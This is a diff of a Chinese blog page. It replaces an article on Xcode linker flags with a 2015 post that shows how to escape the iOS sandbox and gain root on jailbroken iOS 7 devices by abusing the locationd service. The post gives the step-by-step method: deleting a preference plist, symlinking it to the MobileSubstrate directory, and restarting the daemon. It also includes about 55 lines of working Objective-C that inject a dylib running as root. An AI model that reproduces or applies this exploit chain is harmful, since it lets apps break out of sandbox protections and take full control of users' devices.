@@ -18,9 +18,9 @@
 
 
 
-	<meta name="keywords" content="iOS,转载," />
+	<meta name="keywords" content="Tweaks," />
 
-  <title> 关于Xcode的Other Linker Flags // 编程时间 </title>
+  <title> 使用locationd漏洞从sandbox内获取root权限 // 编程时间 </title>
 </head>
 
 <body>
@@ -101,7 +101,7 @@
           
           
             
-              关于Xcode的Other Linker Flags
+              使用locationd漏洞从sandbox内获取root权限
             
           
         </h1>
@@ -110,7 +110,7 @@
       <div class="post-meta">
         <span class="post-time">
           
-            发表于 2015-05-11
+            发表于 2015-05-25
           
         </span>
 
@@ -119,7 +119,7 @@
             <span class="post-category">
               &nbsp; | &nbsp; 分类于
               
-                <a href="/categories/iOS开发/">iOS开发</a>
+                <a href="/categories/iOS安全/">iOS安全</a>
 
                 
                 
@@ -133,8 +133,8 @@
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/05/11/Other-Linker-Flags/#comments" >
-              <span class="post-comments-count ds-thread-count" data-thread-key="2015/05/11/Other-Linker-Flags/"></span>
+            <a href="/2015/05/25/locationd/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2015/05/25/locationd/"></span>
             </a>
           </span>
           
@@ -149,17 +149,13 @@
         
 
         
-          <p>转自：<a href="http://blog.csdn.net/meegomeego/article/details/19343423" target="_blank" rel="external">http://blog.csdn.net/meegomeego/article/details/19343423</a><br><a id="more"></a></p>
-<h2 id="背景">背景</h2><p>在ios开发过程中，有时候会用到第三方的静态库(.a文件)，然后导入后发现编译正常但运行时会出现<code>selector not recognized</code>的错误，从而导致app闪退。接着仔细阅读库文件的说明文档，你可能会在文档中发现诸如在<code>Other Linker Flags</code>中加入-<code>ObjC</code>或者<code>-all_load</code>这样的解决方法。<br>那么，<code>Other Linker Flags</code>到底是用来干什么的呢？还有<code>-ObjC</code>和<code>-all_load</code>到底发挥了什么作用呢？</p>
-<h2 id="链接器">链接器</h2><p>首先，要说明一下<code>Other Linker Flags</code>到底是用来干嘛的。说白了，就是<code>ld</code>命令除了默认参数外的其他参数。<code>ld</code>命令实现的是链接器的工作，详细说明可以在终端<code>man ld</code>查看。<br>如果有人不清楚链接器是什么东西的话，我可以作个简单的说明。<br>一个程序从简单易读的代码到可执行文件往往要经历以下步骤：</p>
-<p><blockquote class="blockquote-left">源代码 &gt; 预处理器 &gt; 编译器 &gt; 汇编器 &gt; 机器码 &gt; 链接器 &gt; 可执行文件 </blockquote><br>源文件经过一系列处理以后，会生成对应的<code>.obj</code>文件，然后一个项目必然会有许多<code>.obj</code>文件，并且这些文件之间会有各种各样的联系，例如函数调用。链接器做的事就是把这些目标文件和所用的一些库链接在一起形成一个完整的可执行文件。<br>可能我描述的比较肤浅，因为我自己了解的也不是很深，建议大家读一下这篇文章，可以对链接器做的事情有个大概的了解：<a href="http://www.dutor.net/index.php/2012/02/what-linkers-do/" target="_blank" rel="external">链接器做了什么</a></p>
-<h2 id="为什么会闪退">为什么会闪退</h2><p>苹果官方Q&amp;A上有这么一段话：</p>
-<p><blockquote class="blockquote-left">The “selector not recognized” runtime exception occurs due to an issue between the implementation of standard UNIX static libraries, the linker and the dynamic nature of Objective-C. Objective-C does not define linker symbols for each function (or method, in Objective-C) - instead, linker symbols are only generated for each class. If you extend a pre-existing class with categories, the linker does not know to associate the object code of the core class implementation and the category implementation. This prevents objects created in the resulting application from responding to a selector that is defined in the category. </blockquote><br>翻译过来，大概意思就是<code>Objective-C</code>的链接器并不会为每个方法建立符号表，而是仅仅为类建立了符号表。这样的话，如果静态库中定义了已存在的一个类的分类，链接器就会以为这个类已经存在，不会把分类和核心类的代码合起来。这样的话，在最后的可执行文件中，就会缺少分类里的代码，这样函数调用就失败了。</p>
-<h2 id="解决方法">解决方法</h2><p>解决方法在背景那块我就提到了，就是在Other Linker Flags里加上所需的参数，用到的参数一般有以下3个：<br><code>-ObjC</code>,<code>-all_load</code>,<code>-force_load</code><br>下面来说说每个参数存在的意义和具体做的事情。<br>首先是<code>-ObjC</code>，一般这个参数足够解决前面提到的问题，苹果官方说明如下：</p>
-<p><blockquote class="blockquote-left">This flag causes the linker to load every object file in the library that defines an Objective-C class or category. While this option will typically result in a larger executable (due to additional object code loaded into the application), it will allow the successful creation of effective Objective-C static libraries that contain categories on existing classes.</blockquote><br>简单说来，加了这个参数后，链接器就会把静态库中所有的<code>Objective-C</code>类和分类都加载到最后的可执行文件中，虽然这样可能会因为加载了很多不必要的文件而导致可执行文件变大，但是这个参数很好地解决了我们所遇到的问题。但是事实真的是这样的吗？<br><br>如果<code>-ObjC</code>参数真的这么有效，那么事情就会简单多了。</p>
-<p><blockquote class="blockquote-left">Important: For 64-bit and iPhone OS applications, there is a linker bug that prevents -ObjC from loading objects files from static libraries that contain only categories and no classes. The workaround is to use the -allload or -forceload flags.</blockquote><br>当静态库中只有分类而没有类的时候，<code>-ObjC</code>参数就会失效了。这时候，就需要使用<code>-all_load</code>或者<code>-force_load</code>了。<br></p>
-<p><code>-all_load</code>会让链接器把所有找到的目标文件都加载到可执行文件中，但是千万不要随便使用这个参数！假如你使用了不止一个静态库文件，然后又使用了这个参数，那么你很有可能会遇到<code>ld: duplicate symbol</code>错误，因为不同的库文件里面可能会有相同的目标文件，所以建议在遇到<code>-ObjC</code>失效的情况下使用<code>-force_load</code>参数。</p>
-<p><code>-force_load</code>所做的事情跟<code>-all_load</code>其实是一样的，但是<code>-force_load</code>需要指定要进行全部加载的库文件的路径，这样的话，你就只是完全加载了一个库文件，不影响其余库文件的按需加载。</p>
+          <h2 id="iOS沙盒机制">iOS沙盒机制</h2><p>　　iOS中的沙盒机制（SandBox）是一种安全体系，它规定了应用程序只能在为该应用创建的文件夹内读取文件，不可以访问其他地方的内容。所有的非代码文件都保存在这个地方，比如图片、声音、属性列表和文本文件等。<br><a id="more"></a><br>　　1.每个应用程序都在自己的沙盒内。<br><br>　　2.不能随意跨越自己的沙盒去访问别的应用程序沙盒的内容。<br><br>　　3.应用程序向外请求或接收数据都需要经过权限认证。<br><br>　　以上3点就是iOS沙盒机制的主要表现，一般来讲普通的用户级别app(从AppStore下载或者从其他第三方应用商店下载的ipa)很难越过iOS沙盒机制，除非有些特殊手段或者一些系统漏洞能利用，这里我们就来讲下<strong>越狱设备</strong>利用<code>locationd</code>漏洞来让ipa程序跳出沙盒来获取root权限。</p>
+<h2 id="准备工作">准备工作</h2><p>1.删除<code>/var/mobile/Library/Preferences/com.apple.locationd.plist</code><br><br>2.软连接<code>/var/mobile/Library/Preferences/com.apple.locationd.plist</code>到需要权限的目录，比如<code>/Library/MobileSubstrate/DynamicLibraries</code><br><br>3.执行<code>CLClientShutdownDaemon()</code>来重启<code>locationd</code>服务,这是<code>/Library/MobileSubstrate/DynamicLibraries</code>目录权限将变为<code>mobile:mobile</code><br><br>4.编写<code>Tweak</code>来hook<code>locationd</code>,并将该<code>Tweak</code>拷贝到<code>/Library/MobileSubstrate/DynamicLibraries</code><br><br>5.再次调用<code>CLClientShutdownDaemon()</code>来重启<code>locationd</code>，这时<code>Tweak</code>也将随着<code>locationd</code>启动而启动，这时<code>Tweak</code>就可以用来做一些高权限的事情了，也就间接的让ipa获取到<code>root</code>权限了，完毕！<br><br>　　以上几点大体介绍了获取<code>root</code>权限要经历的步骤，该步骤在<code>iOS 7.x</code>系统上已验证成功，但是在<code>iOS 8.x</code>系统上第1步骤就失败了，所以<code>iOS 8.x</code>要换种方式实现，现在还在研究中，不过<code>腾讯手机管家Pro</code>已经实现了该功能，技术果然牛逼！废话不多说，先来看下代码如何实现吧!</p>
+<h2 id="实现代码">实现代码</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="keyword">void</span>)operator &#123;</span><br><span class="line">    <span class="built_in">NSFileManager</span> *fileManager = [<span class="built_in">NSFileManager</span> defaultManager];</span><br><span class="line">    <span class="built_in">NSString</span> * plistPath = <span class="string">@"/var/mobile/Library/Preferences/com.apple.locationd.plist"</span>;</span><br><span class="line">    <span class="built_in">NSString</span> * path2 = <span class="string">@"/Library/MobileSubstrate/DynamicLibraries"</span>;</span><br><span class="line">    <span class="built_in">NSError</span> * error = <span class="literal">nil</span>;</span><br><span class="line">    <span class="keyword">if</span> ([fileManager fileExistsAtPath:plistPath]) &#123;</span><br><span class="line">        [fileManager removeItemAtPath:plistPath error:&amp;error];</span><br><span class="line">        <span class="keyword">if</span> (error) &#123;</span><br><span class="line">             <span class="built_in">NSLog</span>(<span class="string">@"error : %@"</span>, error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    [[<span class="built_in">NSFileManager</span> defaultManager] createSymbolicLinkAtPath:plistPath withDestinationPath:path2 error:&amp;error]; <span class="comment">//创建软链接到"/Library/MobileSubstrate/DynamicLibraries"</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (error != <span class="literal">nil</span>) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"error : %@"</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">    CLClientShutdownDaemon(); <span class="comment">//重启locationd服务</span></span><br><span class="line">    [<span class="keyword">self</span> performSelector:<span class="keyword">@selector</span>(injectDylib) withObject:<span class="literal">nil</span> afterDelay:<span class="number">3.0</span>f]; <span class="comment">//延迟3s等待locationd服务启动</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="keyword">void</span>)injectDylib &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSFileManager</span> *fileManage = [<span class="built_in">NSFileManager</span> defaultManager];</span><br><span class="line">    <span class="built_in">NSError</span> *error = <span class="literal">nil</span>;</span><br><span class="line">    </span><br><span class="line">    [fileManage setAttributes:[<span class="built_in">NSDictionary</span> dictionaryWithObject:[<span class="built_in">NSNumber</span> numberWithUnsignedLong:<span class="number">0777</span>] forKey:NSFilePosixPermissions] ofItemAtPath:<span class="string">@"/Library/MobileSubstrate/DynamicLibraries/"</span> error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"NSFilePosixPermissions error:%@"</span>,[error localizedDescription]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSString</span> *documents = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, <span class="literal">YES</span>) objectAtIndex:<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">NSString</span> *zipPath = [[<span class="built_in">NSBundle</span> mainBundle] pathForResource:<span class="string">@"Cappuccino.zip"</span> ofType:<span class="literal">nil</span>];</span><br><span class="line">    <span class="built_in">NSString</span> *targetZipPath = [documents stringByAppendingPathComponent:<span class="string">@"Cappuccino.zip"</span>];</span><br><span class="line">    </span><br><span class="line">    [fileManage copyItemAtPath:zipPath toPath:targetZipPath error:&amp;error];</span><br><span class="line">    <span class="keyword">int</span> res = unZipMain((<span class="keyword">char</span>*)[targetZipPath UTF8String], (<span class="keyword">char</span>*)[documents UTF8String], <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSString</span> *dylibFile = [documents stringByAppendingPathComponent:<span class="string">@"Cappuccino.dylib"</span>];</span><br><span class="line">    <span class="built_in">NSString</span> *plistFile = [documents stringByAppendingPathComponent:<span class="string">@"Cappuccino.plist"</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSString</span> *targetDylibFile = <span class="string">@"/Library/MobileSubstrate/DynamicLibraries/Cappuccino.dylib"</span>;</span><br><span class="line">    <span class="built_in">NSString</span> *targetPlistFile = <span class="string">@"/Library/MobileSubstrate/DynamicLibraries/Cappuccino.plist"</span>;</span><br><span class="line">    </span><br><span class="line">    [fileManage copyItemAtPath:plistFile toPath:targetPlistFile error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"plist error : %@"</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">    [fileManage copyItemAtPath:dylibFile toPath:targetDylibFile error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"dylib error : %@"</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">    CLClientShutdownDaemon(); <span class="comment">//重新启动locationd服务，以便启动插件服务</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　以上代码中出现了<code>Cappuccino.dylib</code>和<code>Cappuccino.plist</code>，(<code>腾讯手机管家Pro</code>抱歉了，我抄袭了你的命名了!)这两个是用来hook<code>locationd</code>服务的插件，也是用来获取<code>root</code>权限的间接桥梁，它里面做的事情也很简单，就是简单的安装<code>deb</code>文件，其实也可以改成其他操作，比如注销，重启等操作，就看用户喜好了，虽然我没有详细的逆向<code>腾讯手机管家Pro</code>在<code>Cappuccino.dylib</code>写了什么样的代码，但是我大体也能猜出里面它其实是用来安装<code>deb</code>文件的，大体是下面这样的操作，<code>dpkg -i DEB_PATH</code>,<code>DEB_PATH</code>请根据需要自行改成自己<code>deb</code>所在的路径，如果你的<code>deb</code>是放在<code>ipa</code>的<code>Documents</code>的话，那也是可以根据<code>ipa的identifier</code>来获取，这里我就不实现了，<code>Cappuccino.dylib</code>和<code>Cappuccino.plist</code>的大体实现请看下图：<br><img src="http://7xijmx.com1.z0.glb.clouddn.com/10.49.09.png" alt="Cappuccino.dylib"><br><img src="http://7xijmx.com1.z0.glb.clouddn.com/10.48.57.png" alt="Cappuccino.plist"></p>
+<h2 id="后记">后记</h2><p>　　到这里为止，我们就跳出了沙盒限制，获取到<code>root</code>权限了，不过以上方法只在<code>iOS 7.x</code>系统上测试过，<code>iOS 8.x</code>测试失败，（但是<code>腾讯手机管家Pro</code>实现了，还有待研究它是如何实现的）<code>iOS 6.x 和iOS 5.x</code>未测试（手头暂无机子)，如果读者感兴趣的话，可自行测试。</p>
+<h2 id="参考">参考</h2><p><a href="http://bbs.iosre.com/t/locationd-sandbox-root/806" target="_blank" rel="external">iOS逆向论坛</a><br><br><a href="http://m.qq.com/?ADTAG=media.innerenter.gj.top" target="_blank" rel="external">腾讯手机管家Pro</a><br></p>
+<p>　　</p>
 
         
       </div>
@@ -170,12 +166,8 @@
         
           <div class="post-tags">
             
-              <a href="/tags/iOS/">
-                #iOS
-              </a>
-            
-              <a href="/tags/转载/">
-                #转载
+              <a href="/tags/Tweaks/">
+                #Tweaks
               </a>
             
           </div>
@@ -185,13 +177,11 @@
           <div class="post-nav">
             <div class="post-nav-prev post-nav-item">
               
-                <a href="/2015/05/25/locationd/">使用locationd漏洞从sandbox内获取root权限</a>
-              
             </div>
 
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2015/05/06/hook-sub-xxx-functions-in-IDA/">如何hook那些在IDA中显示为sub_xxx的函数</a>
+                <a href="/2015/05/11/Other-Linker-Flags/">关于Xcode的Other Linker Flags</a>
               
             </div>
           </div>
@@ -208,8 +198,8 @@
   
     <div class="comments" id="comments">
       
-        <div class="ds-thread" data-thread-key="2015/05/11/Other-Linker-Flags/"
-             data-title="关于Xcode的Other Linker Flags" data-url="http://jatwaston.github.io/2015/05/11/Other-Linker-Flags/">
+        <div class="ds-thread" data-thread-key="2015/05/25/locationd/"
+             data-title="使用locationd漏洞从sandbox内获取root权限" data-url="http://jatwaston.github.io/2015/05/25/locationd/">
         </div>
 
       
@@ -299,7 +289,7 @@
         <div class="post-toc">
           
           
-            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#链接器"><span class="nav-number">2.</span> <span class="nav-text">链接器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么会闪退"><span class="nav-number">3.</span> <span class="nav-text">为什么会闪退</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解决方法"><span class="nav-number">4.</span> <span class="nav-text">解决方法</span></a></li></ol></div>
+            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#iOS沙盒机制"><span class="nav-number">1.</span> <span class="nav-text">iOS沙盒机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#准备工作"><span class="nav-number">2.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实现代码"><span class="nav-number">3.</span> <span class="nav-text">实现代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
           
         </div>
         <div class="post-toc-indicator-bottom post-toc-indicator"></div>
